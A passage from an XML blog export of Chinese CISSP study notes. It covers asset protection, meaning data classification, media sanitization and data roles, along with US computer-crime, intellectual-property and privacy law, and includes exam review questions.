轮换密钥加密C. Skipjack 加密D. Twofish 加密 哪个入围的AES利用了预白噪声化和后白噪声化技术?A. RijndaelB. TwofishC. BlowfishD. Skipjack 全面实现有10人参与的非对称算法需要多少个密钥?A. 10B. 20C. 45D. 100]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（5）——保护资产的安全]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%885%EF%BC%89%E2%80%94%E2%80%94%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E7%9A%84%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有： A. 人对信息及支持资产进行分类(如敏感性、关键性) B. 确定及维护所有权(如数据所有者、系统所有者、业务/任务所有者) C. 保护隐私 C.l 数据所有者 C.2 数据处理者 C.3 数据剩磁 C.4 收集限制 D. 确保适当地保留资产(如介质、硬件、人员) E. 确定数据安全控制(如静态数据、传输过程中的数据) E.l 基准线 E.2 审视和定制 E.3 标准选择 E.4 密码学 F. 建立处理需求(敏感信息的标记、贴签、存储、破坏) 5.1 对资产进行分类和标记5.1.1 定义敏感数据 敏感数据指所有不公开或未分类的信息，可能包括组织需要保护的机密、专有信息，或因数据对组织的价值或组织为遵守现行法律、法规而保护的任何其他类型的数据。 个人身份信息 个人身份信息(PII)是指任何可以识别个人的信息。 受保护的健康信息 受保护的健康信息(PHI)是任何与个人健康有关的信息。 专有数据 专有数据指的是任何帮助组织保持竞争优势的数据。可以是开发的软件代码、产品的技术计划、内部流程、知识产权或商业秘密。 5.1.2 定义分类 组织通常会在安全策略或在单独的数据策略中包括数据分类。数据分类识别的是数据对于组织的价值，并对数据的机密性和完整性保护至关重要。策略确定了组织内使用的分类标签，还确定了数据所有者如何确定合适的分类以及人员应如何根据分类保护数据。 5.1.3 定义数据安全要求 组织至少应该对比较敏感的邮件进行标记和加密。加密是将明文转换为密文，从而增加阅读的难度。采用强大的加密方法，例如，拥有256位加密密钥的高级加密标准(AES 256)，使未被授权者能够阅读加密文章的可能性几乎为零。 5.1.4 理解数据状态 在数据静止、传输以及使用过程中，保护数据的安全性是非常重要的。保护数据机密性的最好方法是使用强大的加密协议。此外，强大的身份验证和授权控制能有效阻止未经授权的访问。 5.1.5 管理敏感数据 管理敏感数据的一个主要目标是防止数据泄露。数据泄露会使任何一个未被授权的实体查看或访问敏感数据。 1. 标记敏感数据 对敏感数据进行标记(通常称为贴签)能确保用户可以轻松识别任何数据的分类级别。标记或标签提供的最重要信息就是关于数据的分类。标记包括物理的和电子的标记和标签。物理标签能指出存储在介质或处理系统上的数据的安全性分类。 2. 管理敏感数据 管理敏感数据是指在介质的整个生命周期内确保传送过程的安全。人们依据数据的价值和分类对其进行不同的管理，高级机密信息需要更强大的保护。 3. 存储敏感数据 敏感数据应存储在受保护且没有任何损失的介质中。最有效的保护办法就是加密。此外，也应该采取环境控制来保护介质的数据安全。这些做法包括温度和湿度控制等。这里有一点终端用户经常忘记： 任何敏感数据的价值都大于存储介质的价值。 4. 销毁敏感数据 适当的破坏可以确保敏感数据不会落入投机者的手中，从而防止未经授权的数据泄露。 擦除 擦除介质上的数据就是对文件、文件的选择或整个介质执行删除操作。 消除 消除或重写是使介质可以重新使用的一个准备过程，这个过程可以确保消除的数据不会通过传统的工具恢复。 清除 清除是比消除更强烈的一种形式，是指在安全性较差的环境中使介质达到可再次使用的准备过程，确保原始数据使用任何己知方法都不会恢复。 解除分类 解除分类是指在非机密情况下对介质或系统进行清除，以使其能够再次使用的准备过程。 净化 净化是指从系统或介质中删除数据，确保数据不会以任何形式恢复。 消磁 消磁工具会建立一个强大的磁场区域，从而以消磁的方法擦除介质上的数据。 销毁 销毁是介质生命周期的最后阶段，也是清除介质数据的最安全方法。 5. 保留资产 保留要求适用于数据或记录、含有敏感数据的介质和系统，以及接触敏感数据的人员。记录保留和介质保留是资产保留的最重要元素。记录保留指的是，在需要信息时保留和维护重要的信息，在不需要时破坏信息。 5.1.6 应用密码学保护机密文件1. 应用对称加密保护数据 对称加密在加密和解密数据一时应用同样的密钥。 高级加密标准算法 高级加密标准算法(AES)是众多算法中最受欢迎的对称加密算法。2001年，美国国家标准技术研究所将它选为标准算法，用以替代旧的数据加密标准算法(DES)。高级加密标准支持的密钥长度为128位、192位和256位。 三重数据加密标准算法 开发者开发了三重数据加密标准算法(3DES)，用以替代数据加密标准算法(DES)。初始实现使用56位密钥，但是新的算法实现了使用112位或168位密钥。 Blowfish Blowfish可用的密钥长度为32位至448位，是一个强大的加密协议。Linux 系统使用bcrypt来加密密码，而bcrypt 这款跨平台文件加密工具就是基于Blowfish。bcrypt添加了额外的128位密钥作为salt值来阻止彩虹表攻击(rainbow table attack) 。 2. 应用传输加密保护数据 传输加密算法在传播之前加密数据，对传输过程中的数据进行保护。通过网络发送未加密数据的最主要风险就是嗅探攻击。攻击者可以使用嗅探器或协议分析器在网络上捕捉流量。嗅探器允许攻击者读取所有以明文发送的数据。 5.2 定义数据角色5.2.1 数据所有者 数据所有者是数据的最终责任人。NIST SP 800-18 概括了信息所有者的以下责任，也可以理解为同样是数据所有者的责任： 制定规则，以便用于主体的数据或信息的适当使用及保护(行为规则)。 为信息系统所有者提供输入，要考虑到信息所在地的信息系统的安全要求和安全控制。 决定谁有权访问信息系统，拥有何种特权或准入权。 协助对信息所在地的普通安全控制进行定义和评估。 5.2.2 系统所有者 系统所有者是拥有含机密数据的系统的人。NIST SP 800-18 概括了系统所有者的以下责任： 开发和信息所有者、系统管理者、功能终端使用者相一致的系统安全计划。 维持系统安全计划井确保系统依照己经同意的安全要求进行部署和运行。 确保系统使用者和支持人员受到适当的安全培训，如行为规则说明(或是AUP) 。 当发生重大变化时，更新系统安全计划。 协助定义、执行和评估通用安全控制。 5.2.3 业务/任务所有者 NIST SP 800-18 指的是业务/任务所有者作为项目经理或信息系统所有者。同样，业务/任务所有者的责任可以和系统所有者的责任有重叠或相同。业务所有者拥有的程序可能是由其他实体管理的系统。 5.2.4 数据处理者 欧盟数据保护法将数据处理者定义为”一个自然人或法人，他拥有个人资料，仅代表数据控制者的利益”。在该条文中，数据控制者是一个控制数据过程的人或实体。 5.2.5 管理员 数据管理员负责将数据以合适的方式授予人员。他们不-定必须拥有全部管理者权限和特权，但是他们可以分配权限。管理员分配权限时需要基于最低权限准则和须知，只有在工作有需要时才会授予使用者。管理员通常会使用基于角色的访问控制模型来分配权限。 5.2.6 保管者 数据所有者经常将每天的任务委任给保管者。通过以适当方式保存和保护数据，保管者协助保护数据的安全性和完整性。在实际中，信息技术部门的人员或者系统安全管理员通常会成为保管者。他们可能是负责分配权限的相同管理员。 5.2.7 用户 用户就是任何通过计算系统获取数据并完成工作任务的人。用户只能获取他们需要用来完成工作任务的数据。 5.3 保护隐私 组织有义务保护他们收集和保存的数据。很多法律要求组织披露他们收集到的数据、收集数据的原因以及准备怎样使用这些信息。此外，这些法律禁止组织以正当使用信息之外的方法使用这些信息。在保护隐私时，组织通常会使用一些不同的安全控制。选择适当的安全控制是一项令人生畏的任务，尤其是对于那些新成立的组织而言。然而，使用安全基准线以及定义相关标准让这项任务变得更简单。 5.3.1 使用安全基线 基线提供了一个起点，确保最低安全标准。各组织使用的一条普通的基线就是镜像。将系统设置成安全状态之后，审计程序要周期性地检查系统，以确保他们维持在安全状态。NIST SP 800-53 讨论了作为安全控制列表的安全控制基准线。它强调，单一的安全控制不能适用于所有情况，但是任何组织都可以选择一组基准线安全控制，并且根据需求做出调整。 5.3.2 审视和定制 审视是指评估基线安全控制，然后只选择那些适用于想保护的盯系统的控制。定制是指修改基线内的安全控制列表，使其与组织的使命相适应。 5.3.3 选择标准 在选择基线内的安全控制时，组织需要确保控制符合某些外部安全标准。外部元素通常定义了对组织的强制性要求。 5.4 考试要点 理解数据分类的重要性 数据所有者负责定义数据分类，确保系统和数据被正确标记。此外，数据所有者定义保护不同分类的数据的需求，比如对静态数据和传输中的敏感数据进行加密。数据分类通常在安全策略或数据策略中定义。 知道PII和PHI 个人身份信息(PII)是任何可以识别个人的信息。受保护的健康信息(PHI)是指任何与特定个人的健康有关的信息。许多法律、法规都规定保护PII和PHI。 知道如何处理敏感信息 敏感信息是指所有类型的机密信息，正确地管理它们可以帮助防止由于未经授权的披露而失去保密。适当的管理包括标志、处理、存储和破坏敏感信息。组织经常漏掉标记的两个区域是充分保护承载敏感信息的备份介质以及在介质和设备生命周期结束时对其进行净化。 理解记录保留 记录保留策略确保在需要数据时，将数据保存在可用状态，在不需要数据时将其破坏。许多法律、法规都规定数据要在特定的时间内进行保存，但是没有正式的规定，因此组织会在策略中指定保留时间。审计跟踪数据需要保持足够长的时间来重建过去的事件，但是组织必须确定他们想要调查多久之前的数据。许多组织当前的趋势是通过对电子邮件实施短期保留策略来减少法律责任。 知道不同角色之间的区别 数据所有者负责分类、标记和保护数据。系统所有者负责处理数据的系统。业务和任务所有者拥有流程，并确保系统对组织的价值。数据处理者通常是为组织处理数据的第三方实体。管理员基于数据所有者提供的指导方针授权访问数据。用户在执行工作任务的过程中访问数据。保管者负责日常存储和保护数据。 了解7 条安全港原则 欧盟数据保护法规定保护隐私数据。第三方同意遵守7 条安全港原则，以确保它们遵守欧盟数据保护法。7 条原则是通知、选择、向前传输、安全性、数据完整性、访问和执行。 了解安全控制基线 安全控制基线提供一份组织可以用作基线的控制清单，并不是所有的基线适用于所有的组织。然而，组织可以应用审视和定制技术来选择满足自身需求的基线。 5.5 复习题 下面哪一项指的是分类过程的主要目的?A. 定义保护敏感数据的要求B. 定义备份数据的要求C. 定义存储数据的要求D. 定义传输数据的要求 在确定数据分类时，以下哪一项是最重要的考虑因素?A. 处理系统B. 价值C. 存储介质D 可访问性 以下哪个答案不属于敏感数据?A. 个人身份信息(PII)B. 受保护的健康信息(PHI)C. 专有数据D 发布在网站上的数据 标记介质的最重要方面是什么?A. 日期标签B. 内容描述C. 电子标签D. 分类 在将分类介质再次用到不太安全的环境中之前，管理员通常会怎样做?A. 擦除B. 消除C. 消除D. 重写 以下哪个描述正确表述了净化方法的问题?A. 没有移除数据的方法，保证了未授权人员不能检索数据。B. 即使已被完全焚烧的介质也会提供可推断出的数据。C. 人员可能会不适当地执行净化步骤。D. 存储的数据被物理销毁介质。 以下哪个选项是摧毁固态硬盘上数据的最可靠方法?A. 擦除B. 去磁C. 删除D. 清除 以下哪个选项是删除DVD上数据的最安全方法?A. 格式化B. 删除C. 销毁D. 去磁 以下哪一项不会擦除数据?A. 消除B. 清除C. 重写D. 剩磁 以下哪一项基于Blowfish并能保护免受彩虹表袭击?A. 3DESB. AESC. bcryptD. SCP 管理员会用以下哪一项来安全连接远程服务器以进行管理?A. TelnetB. 安全文件传输协议(SFTP)C. 安全拷贝(SCP)D. 安全外壳(SSH) 以下哪一项是保管者通常会执行的任务?A. 访问数据B. 分类数据C. 分配数据权限D. 备份数据 以下哪个数据角色最可能有权授予用户对数据的访问权?A. 管理员B. 保管者C. 所有者D. 用户 以下哪一项是对数据所有者确立的”行为规则”的最好定义?A. 确保用户只被授予对他们所需东西的访问权。B. 决定对系统有访问权的人。C. 识别对数据的恰当使用和保护。D. 对系统实施安全控制。 在欧盟数据保护法的背景下，以下哪一个是数据处理者?A. 代表数据控制者处理个人数据的实体B. 控制数据处理的实体C. 处理数据的计算系统D. 处理数据的网络 通知、选择、向前传输及访问原则最适用的是?A. 保密B. 识别C. 保留D. 分类 组织正在实施安全控制的预选基线，但发现不是所有的控制都适用。他们应该做些什么呢?A. 不管怎样，实施所有控制B. 确定另一条基线C. 重新创建一条基线D. 根据他们的需求定制基线 在回答问题18至20时请参考下面的场景：一个组织有一个数据中心，24小时全天处理高级敏感信息。数据中心包括电子邮件服务器，管理员会清理超过6个月的电子邮件，以遵守组织的安全策略。对数据中心的访问是受控制的，所有处理敏感信息的系统都进行了标记。管理员定期备份在数据中心处理的数据。他们在现场保留一份备份，并把没有标记的备份发送到公司的一个仓库。仓库工人按日期整理介质，他们有过去20年的备份。员工白天在仓库工作，晚上和周末在离开前会将仓库锁闭。最近，仓库发生了盗窃，丢失了所有的离线备份磁带。之后，他们数据的副本，包括几年前的敏感电子邮件，开始出现在互联网网站上，因此组织的内部敏感数据被公开。 在下面的选项中，哪一项可以在不牺牲安全性的情况下阻止此丢失事件的发生?A. 标记场地外保存的介质B. 不要把数据存储在场地外C. 将场地外的备份全部摧毁D. 使用安全的场地外存储设备 以下哪个管理员行为可以阻止此事件的发生?A. 在把磁带送到仓库之前对它们进行标记B. 在磁带上备份数据之前清理磁带C. 在磁带上备份数据之前对磁带进行去磁D. 将磁带加入资产管理数据库 在以下选项中，关于备份介质不遵守哪一项策略?A. 介质销毁B. 记录保留C. 配置管理D. 版本控制]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（4）——法律、法规和合规性]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%884%EF%BC%89%E2%80%94%E2%80%94%E6%B3%95%E5%BE%8B%E3%80%81%E6%B3%95%E8%A7%84%E5%92%8C%E5%90%88%E8%A7%84%E6%80%A7%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性) C. 合规性 C.l 法律和法规遵从 C.2 隐私需求遵从 D. 理解全球范围内涉及信息安全的法律和法规问题 D.l 计算机犯罪 D.2 许可和知识产权(例如，版权、商标、数字版权管理) D.3 进口/出口控制 D.4 跨境数据流 D.5 隐私 D.6 数据破坏 4.1 法律的分类4.1.1 刑法 刑法形成了法律体系的基石，维护着我们所处社会的和平和安全。刑法包含针对某些行为的禁令，如谋杀、伤害、抢劫、纵火和类似的犯罪行为。对违反刑法的处罚有一个范围，包括强制性劳教、以罚金形式的货币处罚(或多或少)、以监狱判决形式剥夺公民自由权。 4.1.2 民法 民法形成了法律体系的大部分。它们用于维护社会秩序，并管理不属于犯罪行为但需要一位公正的仲裁者来解决的个人之间和组织之间的问题。民法还被用于创建政府框架，行政机构使用这个体系架构来履行自己的职责。 4.1.3 行政法 刑法和民法制定的规则和措施不可能在任何可能的情况下都被遵守。因此，执行机构有制定行政法的回旋余地，从而以政策、规章和制度的方式管理机构的日常运作。虽然行政法不需要立法机构的法案来获得法律的效力，但是必须遵守所有己存在的民法和刑法。 4.2 法律4.2.1 计算机犯罪1. 计算机诈骗和滥用法案 美国国会在1984年首先制定了计算机欺诈和滥用法案(CFAA)，并且通过一些修正后，直到今天仍然在执行。这条法律经过精心编写，专门用于跨越州边界的计算机犯罪，避免违反州的权力和践踏宪法。法案的主要条款主要针对下列这些罪行： 没有经过授权或超出了权限范围而访问联邦系统中的机密信息或财务信息。 没有经过授权而访问只能由联邦政府使用的计算机。 使用联邦计算机进行欺诈活动(除了欺诈的唯一目标是要使用计算机本身) 。 对联邦计算机系统造成恶意损失超过1000美元的行为。 修改计算机中的医疗记录，从而影响或可能影响个人的检查、诊断、治疗或医疗看护。 非法买卖计算机密码，如果非法买卖行为影响了州间的贸易或涉及联邦的计算机系统。 计算机欺诈和滥用法案在1986年经过了修正，法案的作用范围也有所改变。除了处理敏感信息的联邦计算机之外，法案中还包括了所有的涉及联邦利益的计算机。增加了如下范围： 由美国政府专门使用的所有计算机。由金融机构专门使用的所有计算机。 当犯罪活动妨碍了政府或机构使用系统的能力时，由政府或金融机构专门使用的计算机。 不处在同一个州的被用于犯罪活动的所有计算机的组合。 2. CFAA修正案(1994年) 宣布那些可能造成计算机系统损害的、生成任何类型恶意代码的行为是不合法的。 修改了CFAA，包含了所有被用于州间贸易的计算机，而不只是包含用于联邦利益的计算机系统。 允许关押罪犯，不管他们是否造成了实际的损坏。 为计算机犯罪的受害者提供了提起民事诉讼的法律权力，对受到的损失可以申请获得减轻和补偿。 3. 计算机安全法案(1987年) 美国国会成员对他们看到的情况很不满意，进而制定了计算机安全法案(CSA，1987年)，为所有的联邦机构设置了安全要求基准。在引入CSA时，美国国会详细规定了法案的4 个主要目的，如下所示： 授予美国国家标准技术研究所(NIST)开发联邦计算机系统标准和准则的职责，包括负责为联邦计算机系统开发标准和准则。在适当时使用美国国家安全局(NSA)的技术性建议和援助(包括工作产品)。 颁布这些标准和准则。 要求包含敏感信息的联邦计算机系统的所有操作人员制定安全计划。 要求包含敏感信息的联邦计算机系统所涉及的所有管理、使用和操作人员强制性参加定期培训。 这条法案中宣布的许多要求经过很多年形成了美国联邦计算机安全策略的基础，而且还将计算机安全的责任分摊给两个联邦机构。原来美国国家安全局(NSA)对所有的计算机安全问题都有权限，现在只保留了对机密系统的权限。美国国家标准技术研究所(NIST)获得了负责保护其他所有联邦政府系统的权利。 4. 美国联邦判决指导方针 1991年发布的美国联邦判决指导方针提供了处罚指导方针，从而帮助联邦法官解释说明计算机犯罪的相关法律。如下所示，这些指导方针的三个条款对信息安全团体产生了持久的影响： 指导方针使审慎者规则成为书面形式，这种规则要求高级行政长官个人负责确保平常的适度关注，审慎的个人会经历相同的情况。这条在财政责任领域中开发的规则现在也被应用于信息安全领域。 通过证明使用适度关注来履行自己的信息安全责任，指导方针允许组织和行政长官遭受最小的违法处罚。 指导方针概述了三个为疏忽提供证据的责任。首先，被控疏忽的人员必须具有法律上认可的责任。其次，被控人员必须未遵守公认的标准。最后，疏忽行为和随后，的受损之间必须存在因果关系。 5. 美国国家信息基础设施保护法案(1996年) 1996年，美国国会还通过了对计算机诈骗和滥用法案的一系列修正案，从而进一步扩展了其提供的保护范围，其中包括了下面这些新覆盖的领域： 放宽了法案的范围，除了用于州间贸易的计算机系统，还包括用于国际贸易的计算机系统。 扩展了对国家基础设施(除了计算系统外还有铁路、燃气管道、电网和通信线路)的类似保护。 对于故意的或不计后果的造成国家基础设施重要部分损坏的行为，作为重罪处理。 6. 文书精简法案(1995年) 文书精简法案(1995年)要求机构在请求大多数类型的公共信息之前，必须获得美国行政管理和预算局(Office ofManagement and Budget，OMB)的批准。信息收集包括表格、会谈、记录保存要求以及其他各种行为。 7. 政府信息安全改革法案(2000年) 2000年的美国政府信息安全改革法案(GISA)修正了美国法典，从而实施了额外的信息安全策略和措施。在该法案的文本中，美国国会为建立GISRA设置了下列5个基本目标： 提供内容全面的体制，从而建立和确保控制那些支持联邦工作和资产的信息资源的有效性。 认识到联邦计算环境高度网络化的特点，其中包括联邦政府协同工作能力的需要以及改善的安全管理措施的实现，从而保证协同工作的能力不会受到负面影响。 提供有效的政府范围内的管理以及监督与安全风险相关的信息，包括贯穿所有市民、国家安全和执法社区的信息安全工作。 为保护联邦信息和信息系统安全所需的最小控制措施提供开发和维护。 为联邦机构信息安全程序的监督措施的改进提供机制。 GISRA还创建了一种新的计算机系统类别。关键任务系统满足下面的标准之一： 被其他法律条款定义为国家安全系统。 由为机密信息而建立的措施保护。 对所处理的信息发生丢失、误用、泄露或未经授权的访问，或者对所处理的信息的任何修改都会对机构的任务产生不良影响。 8. 美国联邦信息安全管理法案 在2002年通过的美国联邦信息安全管理法案(Federal Information Security Management Act，FISMA)要求联邦机构实施一个信息安全项目，这个项目要覆盖机构部门的运营。FISMA 同样也要求政府部门，包括承包商在内的活动在安全管理项目内。美国国家标准技术研究所(NIST)负责开发FISMA实施指南，概括了下面的关于一个有效信息安全项目的要素： 定期评估风险，包括可能由未授权的访问、使用、信息披露、破坏、修改，或由信息破坏和支撑着组织运营的系统以及组织的资产导致的伤害，将它们降低到最小。 基于风险评估的策略和程序，在成本效益原则下把信息安全风险降低到一个可接受的级别，以及确保信息安全贯穿于组织每个信息系统的整个生命周期中。 下级计划为网络、设施、信息系统或信息系统群体提供恰当的信息安全。 通过安全意识培训去告知每个人(包括承包商和其他支撑着组织运营和资产的信息系统用户)，信息安全风险关系到他们的活动和责任，要遵守为了降低这些风险由组织设计的策略和程序。 定期测试和评估信息安全策略、程序、实践和安全控制的有效性，执行频率取决于风险，但每年至少一次。 规划、实施、评估和记录补救措施的过程，去解决信息安全策略、程序和组织实践中任何不足的地方。 制定对信息安全事件检测、报告和响应的流程。 制定计划和程序来确保支撑着组织运营和资产的信息系统的持续运行。 4.2.2 知识产权 我们将介绍与4 种主要知识产权类型(版权、商标权、专利权和商业秘密)相关的法律，并且还将讨论这些概念如何与信息安全专家相关联。许多国家以不同的方式保护(或不予以保护)这些权力，但是基本的概念在世界各地大体相同。 1. 版权和数字干禧年版权法案 版权法保护”原创作品”的创作者，防止创作者的作品遭到未经授权的复制。目前有下列8种主要的作品类别受到版权保护： 文学作品 音乐作品 戏剧作品 哑剧和舞蹈作品 绘画、图形和雕刻作品 电影和其他音像作品 声音录音 建筑作品 软件版权属于文学作品这一类。版权法只保护计算机软件中内在的表达方式，也就是实际的源代码，不保护软件背后的思想或过程。目前有一个正规的过程可以获得版权，将受到保护的作品连同注册费用一起送到美国国会图书馆。然而，注意到下面这一点很重要：正式登记版权不是实施版权的先决条件。实际上，法律规定作品的创作者从作品产生出来起就立即自动享有版权。如果能在法院证明你就是作品的创作者(也可能是发行者)，那么你就会受到版权法的保护。正式注册只是让政府承认他们在具体的日期收到了你的作品。 版权的所有权总是属于作品的创作者。这个政策的特例是：作品是租用的。员工在日常工作期间生产出的作品被认为是”租用的”。目前的版权法提供了一个相当长的保护时间。有一位或多位创作者的作品，被保护的时间是直到最后一位创作者死后70年。租用的作品和匿名作品被保护的时间是以下两项中时间较短者： 从第一次发表日期起的95年，或从创作日期起的120年。 在1998年，美国国会认识到迅速变化的数字技术正在延伸至现行的版权法。为了迎接这个挑战，他们制定了引起广泛讨论的数字干禧年版权法案(Digital Millennium Copyright Act，DMCA)。DMCA还被用于使美国的版权法符合世界知识产权组织仰Orld Intellectual Property Organization，WIPO)条约中的两个条款。DMCA 的第一个主要条款是阻止那些挫败版权保护机制的企图，这些保护机制由版权所有者用于受保护的作品。这个条款被设计用于保护阻止复制数字介质的机制，如CD和DVD。 DMCA对重复罪行规定了高达100万美元和10年监禁的处罚。非营利性机构(如图书馆和学校)被从这个条款中免除。 DMCA还限制了当网络服务提供商的线路被罪犯用来违反版权法时应当承担的责任。DMCA认识到，ISP的法律地位与电话公司”普通运营商”的地位类似，并且对于他们的用户的暂时性行为不承担责任。为了符合免除条件的资格，服务提供商的活动必须符合下列各项要求： 传输必须由提供商之外的某个人发起。 传输、路由、连接准备或复制必须由自动化的技术过程执行，而不是由服务提供商进行选择。 服务提供商不能决定数据的接收者。 任何中间的复制品除了预期的接收者以外，不能让任何人民问，并且保留的时间不能超过合理的需要时间。 不能修改所传输数据的内容。 DMCA还免除了服务提供商有关系统缓存、搜索引擎和个人用户在网络上存储信息的活动。然而，在这些情况中，服务提供商必须采取迅速的行动，在接到侵权通知之时删除受版权保护的内容。 美国国会在DMCA中还包括了这样的条款，允许备份计算机软件和维护、测试或需要复制软件的日常活动。这些条款只应用于经过许可的在特定计算机上使用的软件，用法要符合许可证协议，并且这些复制品在不再需要允许的活动时必须被立刻删除。 最后，DMCA清楚地说明了版权法原则在新兴的Web广播领域中的应用。所谓Web广播，即通过互联网以广播形式，将音频或视频内容传送给接收者。这种技术通常被称为流式音频或流式视频。DMCA声明，这些使用被认为是”合法的非预定传输”。 2. 商标 版权法被用来保护创造性的作品，对于商标也有保护。商标是单词、口号和标志语，被用于标识某家公司及其产品或服务。保护商标的主要目的是在保护个人和组织的知识产权时避免市场发生混乱。与版权的保护一样，为了获得法律的保护，商标不需要正式注册。 商标注册的一个主要好处是： 可以注册一个想要使用的商标，但不必是己经使用的商标。这种类型的应用被称为”使用意向(intent to use)”，并且从提供文档的申请之日起保护商标权(假定在特定期限内将商标真正投入商用)。如果选择不向PTO注册商标，那么保护从第一次使用商标时开始。在美国，接受商标应用主要有下列两个要求： 该商标不能与其他商标类似，以免造成混淆。这需要在律师尽职搜索期间予以确定。在该商标的开放接受反对意见期间，其他公司可以对应用的商标提出质疑。 该商标不应该对所提供的产品和服务加以描述。例如，” Mike’s Software Company” 就不是一个好的商标候选名称，因为它描述了该公司生产的产品。如果USPTO 认为该商标具有描述性，就可能拒绝它的应用。 在美国，商标准许的初始期是10年，年限到了可以再连续不受限制地使用10年。 3. 专利权 专利权是保护发明者的知识产权。他们提供20 年的保护，在这期间发明者具有独家使用发明的权力(无论是直接使用还是通过许可协议) 。在专利专用期结束时，该发明在公共领域允许任何人使用。专利权有下列三个主要的要求： 该发明必须是新的。只有在发明是原始创意时，才能申请专利。 该发明必须是有用的。它必须能够实际工作并完成某种类型的任务。 该发明不能是显而易见的。例如，你不能为你的主意(即使用喝水的杯子收集一杯雨水)而获得专利权。然而，你可以设计一个特殊的杯子，能优化收集到的雨水，并且将蒸发量减到最少，这个解决方案就可以获得专利。 4. 商业秘密 很多公司都有知识产权，这对于他们的业务绝对关键，并且如果泄露给竞争对手或公开，都会会导致相当大的损害，这也就是商业秘密。前面讨论的版权和专利这两种知识产权工具可能被用于保护这种信息类型，但是却具有下列两个主要缺点： 提出版权或专利应用申请时，要求公开地透露你的工作或发明的细节。这自动去除了产权的”秘密”特性，并且可能由于去除了产品的神秘或者允许不择手段的竞争对手违反国际知识产权法拷贝你的产权而对公司造成伤害。 版权和专利都提供有限时间的保护。一旦合法保护过期，那么其他公司就可以随意使用你的工作成果(并且他们拥有在申请过程中公开透露的所有细节)。 官方关于商业秘密的处理过程实际上没有那么多，就它们的本质而言，不必向任何人登记，而是自己保持秘密。为了保持秘密，必须对企业实施适当的控制，确保只有经授权的需要了解这些秘密的人才可以访问这些秘密。还必须确保任何具有这类访问能力的人遵守不泄漏协议(NonDisclosureAgr民ment，NDA)以防止与他人共享，并且对违背协议的行为进行处罚。 5. 许可证 安全专家还应当熟悉软件许可证颁发协议的相关法律问题。许可证具有下列4种类型： 合同许可证协议在软件商和用户之间采用书面的合同概述双方的责任。这些协议常见于高价的和/或特别专用的软件包。 收缩性薄膜包装的许可证协议是写在软件包装外面的协议。由于常常规定撕开封装软件包的收缩薄膜包装就承认了合同条款，因而得名。 单击包装许可证协议比收缩性薄膜包装协议更普遍。在这种协议类型中，合同条款或者写在软件包装盒外，或者包括在软件文档中。在安装过程中，你被要求单击一个按钮，表示己经阅读了协议条款并且同意遵守这些条款。这为协议的认同过程增添了积极的认可，确保使用者在安装之前知道协议的存在。 云服务许可协议让单击协议走向了极端。大部分云服务不需要任何形式的书面协议，而是在屏幕上简单闪现法律条款供检阅。在一些情况下，它们也许简单地为用户提供一个到法律条款的链接，以及一个确认己经阅读并同意条款的确认框。对于兴奋地访问一个新服务的大部分用户，他们不阅读协议就简单单击通过，这可能无意中使他们的整个组织负有法律责任的条款和条件。 4.2.3 进口/出口 美国联邦政府认识到，驱动互联网和电子商务发展的、非常类似的计算机和加密技术，还可能成为军用的强大工具。因此，在冷战期间，美国政府出台了一套复杂的规定，以便控制向其他国家出口敏感的硬件和软件产品。规定包括新技术、知识产权和个人身份信息的跨境数据流管理。直到最近，除了一些选择的盟国之外，向美国以外国家或地区出口强大能力的计算机还是很难的事情。对于加密软件的出口控制甚至更严，实质上向美国以外国家或地区出口加密技术是不可能的。最近美国联邦策略的一些改变已经放松了这些限制，从而提供更加开放的商业环境。 1. 计算机出口控制 当前，美国公司可能将高性能的计算机系统出口到事实上没有受到美国政府事先许可的一些国家。如果某些国家被美国商务部的工业和安全局认为，它们构成核扩散问题、支持恐怖主义或与此相关，那么对这些国家来说这条”规则”就是例外的。 2. 加密产品出口控制 美国商务部的工业和安全局对向美国以外的国家出口加密产品建立了又一个规定。在前面的规定中，事实上即使向美国以外的国家出口相对低等级的加密技术也是不可能的。这使得美国的软件制造商与没有这些限制的外国公司相比，具有很大的竞争劣势。在经过软件企业的长期游说之后，美国总统指示美国商务部修订其规定，以促进美国安全软件业的成长。 现在的规定定义了安全软件的零售种类和大规模市场销售。现在这些规则准许公司提交这些产品，由美国商务部进行复审，但是复审将不会超过30 天，在复审成功地完成后，这些公司就可以自由地出口这些产品。 4.2.4 隐私 在美国，隐私权己经成为多年来争论的热门问题。争论的主要问题是宪法的权利法案没有明确规定隐私权。然而，很多法院都已经支持这个权力，并且像美国公民自由协会(American Civil LibertiesUnion，ACLU)这样的组织也在积极地追求这个权力。欧洲人同样一直在关注他们的隐私。实际上，像瑞士这样的国家由于其保护财务秘密的能力己为世界所知。 1.美国隐私法 第四修正案 隐私权的基础是美国宪法的第四修正案，内容如下所示：人们保护其人身、房屋、证件和财物不受无理搜查和没收的权利不应当被违反，并且这些违反行为不应得到投权批准，但是那些可能性很大的原因、受到誓词或证词支持的、特别描述的需要搜查的地方和需要被逮捕或扣押的人或物品除外。这个修正案的直接解释防止了美国政府机构在缺乏授权批准和可能性很大的原因的情况下对私有财产进行搜查。一些美国法院己经扩展了其对第四修正案的解释，包括针对窃听和侵犯其他隐私的防护。 隐私法案(1974年) 美国的隐私法案(1974年)可能是对美国联邦政府处理公民个人私有信息的方法进行限制的最重大的隐私立法，它严格地限制了美国联邦政府机构在没有事先得到当事人书面同意的情况下向他人或其他机构泄漏隐私信息的能力。这个法案还规定了一些例外，涉及人口普查、执法、国家档案、健康和安全以及法院判决。隐私法案要求政府机构只维护那些对于管理其业务必要的记录，并且在政府的合法职能不再需要时销毁这些记录。它为个人对这些政府维护的记录进行访问并要求修正不正确的记录规定了正式的程序。 电子通信隐私法案(1986年) 电子通信隐私法案(Electronic Communication Privacy 